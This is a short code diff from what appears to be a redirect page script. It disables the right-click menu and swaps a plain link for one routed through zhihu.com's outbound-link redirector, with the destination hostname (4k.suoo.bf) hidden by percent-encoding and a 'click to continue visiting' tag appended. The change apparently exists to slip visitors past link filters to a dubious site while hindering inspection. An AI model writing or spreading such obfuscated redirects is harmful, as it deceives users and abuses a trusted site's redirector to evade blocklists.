@@ -17,7 +17,7 @@ setInterval(function () {
 
 
 document.oncontextmenu = function () { return false; };    
- var x='https://4k.suoo.bf/?k';
+ var x='https://link.zhihu.com/?target=https://%34%6b%2e%73%75%6f%6f%2e%62%66/?%E7%82%B9%E5%87%BB%E7%BB%A7%E7%BB%AD%E8%AE%BF%E9%97%AE';
     $(function () {
         let u = window.document.location.href.toString().split("?");
         if (typeof (u[1]) == "string") {
